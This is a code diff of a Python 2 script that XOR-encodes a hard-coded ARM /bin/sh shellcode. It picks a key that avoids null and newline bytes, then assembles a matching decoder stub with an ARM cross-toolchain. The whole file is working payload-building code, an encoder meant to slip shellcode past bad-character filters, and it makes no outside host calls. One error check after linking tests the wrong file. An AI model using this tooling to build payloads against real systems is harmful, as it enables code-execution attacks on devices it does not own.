@@ -2,6 +2,22 @@
 import os
 import tempfile
 
+# Assembler 
+BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
+# Linker
+BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
+# Objcopy
+BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'
+
+
+def cleanup(fn):
+    for f in fn:
+        if os.path.exists(f) == True:
+            try:
+                os.unlink(f)
+            except:
+                pass
+
 def MakeXOR(size, xor=0x58):
     XOR="""
     .global _start
@@ -32,29 +48,98 @@ def MakeXOR(size, xor=0x58):
     fn = tempfile.mktemp() # binary file
     fn_s = fn + '.s' # as file
     fn_o = fn + '.o' # ld file
-    fn_raw = fn + '.raw' # objcopy
+    fn_raw = fn + '.raw' # objcopy 
+    will_be_deleted = [fn, fn_s, fn_o, fn_raw]
 
+    # write a source
     open(fn_s, 'w').write(XOR)
-    os.system("as %s -o %s;ld %s -o %s" % (fn_s, fn_o, fn_o, fn));
-    os.system("objcopy -I elf32-little -j .text -O binary %s %s" % (fn, fn_raw))
-    if os.path.exists(fn_raw) == False:
-        return ""
-    
-    f = open(fn_raw,'rb').read()
 
-    os.unlink(fn)
-    os.unlink(fn_s)
-    os.unlink(fn_o)
-    os.unlink(fn_raw)
+    # compile a source
+    COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
+    os.system(COMPILE)
+    if os.path.exists(fn_o) == False:
+        print "Failed to compile a source: %s" % (fn_s)
+        cleanup(will_be_deleted)
+        return ""
+
+    # link an object
+    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
+    os.system(LINKING)
+    if os.path.exists(fn_o) == False:
+        print "Failed to link an object: %s" % (fn_o)
+        cleanup(will_be_deleted)
+        return ""
+
+    # objcopy 
+    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
+    os.system(OBJCOPY)
+    if os.path.exists(fn_raw) == False:
+        print "Failed to make a raw file: %s" % (fn)
+        cleanup(will_be_deleted)
+        return ""
+
+    f = open(fn_raw,'rb').read()
+    cleanup(will_be_deleted)
 
     return f
 
-# /bin/sh
-SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')
+def findXorKey(sc, bc=['\x00', '\x0a']):
+    """find XOR key to scramble and to avoid all of bad chars such as 0x00
+        arg:
+            sc (str): shellcode
+            bc (list): bad chars to avoid
 
-XORSC = ''
-for v in SC:
-    XORSC += chr( ord(v) ^ 0x58 )
+        return:
+            key (int): XOR key
 
-XORER = MakeXOR(len(XORSC))
-print (XORER + XORSC)
+        Examples:
+            >>> print findXorKey(sc)
+            2
+    """
+    size = len(sc)
+    bcs  = bc
+    for i in range(0x01, 0xFF+1):
+        key = i
+        for s in sc:
+            x = (ord(s) ^ i)
+            if chr(x) in bcs:
+                key = -1
+                break
+        if key != -1:
+            return key
+    return -1
+
+
+def encodeShellcode(sc, key):
+    """encodes shellcode with key to avoid all of bad chars such as 0x00
+        arg:
+            sc (str)     : shellcode
+            key (int/str): XOR key
+
+        return:
+            xoredSC (str): XORed Shellcode
+
+        Examples:
+            >>> print encodeShellcode(sc, findXorKey(sc))
+            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
+    """
+
+    xsc = ''
+    for i in range(0, len(sc)):
+        xsc += chr( ord(sc[i]) ^ key )
+    
+    return xsc
+
+if __name__ == '__main__':
+    # /bin/sh
+    SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')
+
+    # find xor key to xor the shellcode
+    key = findXorKey(SC)
+    print "Found a xor key:", key
+    # encode with xor key
+    XORSC = encodeShellcode(SC, key)
+    # build a decoder
+    XORER = MakeXOR(len(XORSC), key)
+    #print (XORER + XORSC)
+    print repr(XORER)
